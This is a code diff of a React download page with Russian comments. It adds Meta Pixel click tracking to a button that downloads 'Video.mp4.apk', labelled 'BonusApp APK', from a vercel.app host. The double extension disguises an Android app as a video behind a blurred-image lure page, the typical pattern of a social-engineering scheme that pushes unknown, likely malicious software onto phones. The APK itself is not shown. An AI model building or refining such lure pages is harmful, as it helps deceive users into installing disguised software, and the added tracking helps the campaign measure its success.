@@ -1,5 +1,13 @@
 import React, { useEffect } from 'react';
 
+// Важно: Эта функция проверяет, доступна ли fbq, перед её вызовом
+const trackMetaEvent = (eventName, properties = {}) => {
+  if (typeof window.fbq === 'function') {
+    window.fbq('track', eventName, properties);
+  }
+};
+
+
 export default function CollectionPage() {
   // Устанавливаем текущую дату
   useEffect(() => {
@@ -13,11 +21,24 @@ export default function CollectionPage() {
         day: 'numeric'
       });
     }
+    // Поскольку это SPA, нам также нужно отправить событие PageView
+    // при монтировании компонента, если оно не было отправлено глобально.
+    // Однако, базовый код, который мы поместили в index.html, уже это делает.
+    // Оставляем только отслеживание кастомного события.
+
   }, []);
 
   // Обработчик скачивания
   const handleDownload = (e) => {
     e.preventDefault();
+
+    // 💡 ШАГ 1: Отправляем пользовательское событие Meta Pixel (Facebook Pixel)
+    trackMetaEvent('DownloadButton_Click', {
+        content_name: 'BonusApp APK',
+        value: 0.00, // Если нет финансовой ценности
+        currency: 'USD'
+    });
+    
     // Замени на реальную ссылку на APK
     const link = document.createElement('a');
     link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
@@ -31,6 +52,7 @@ export default function CollectionPage() {
   return (
     <div
       style={{
+        // ... (остальной код стилей остается прежним)
         position: 'relative',
         width: '100%',
         height: '100vh',
@@ -41,9 +63,10 @@ export default function CollectionPage() {
         backgroundColor: '#000'
       }}
     >
-      {/* Фон с размытием (если нужен blur — добавь backdrop-filter) */}
+      {/* Фон с размытием */}
       <div
         style={{
+          // ... (остальной код стилей остается прежним)
           position: 'absolute',
           top: 0,
           left: 0,
@@ -52,14 +75,15 @@ export default function CollectionPage() {
           backgroundImage: "url('/img/image.jpg')",
           backgroundSize: 'cover',
           backgroundPosition: 'center',
-          filter: 'blur(8px)', // добавил размытие, как в твоём описании
-          transform: 'scale(1.1)' // чтобы не было пустых краёв после blur
+          filter: 'blur(8px)',
+          transform: 'scale(1.1)'
         }}
       ></div>
 
       {/* Основной контент */}
       <div
         style={{
+          // ... (остальной код стилей остается прежним)
           position: 'relative',
           top: '50%',
           transform: 'translateY(-50%)',
@@ -73,7 +97,7 @@ export default function CollectionPage() {
 
         <button
           id="download-btn"
-          onClick={handleDownload}
+          onClick={handleDownload} // <--- Ключевой момент: handleDownload вызовет отслеживание
           style={{
             padding: '15px 40px',
             backgroundColor: '#ff0055',
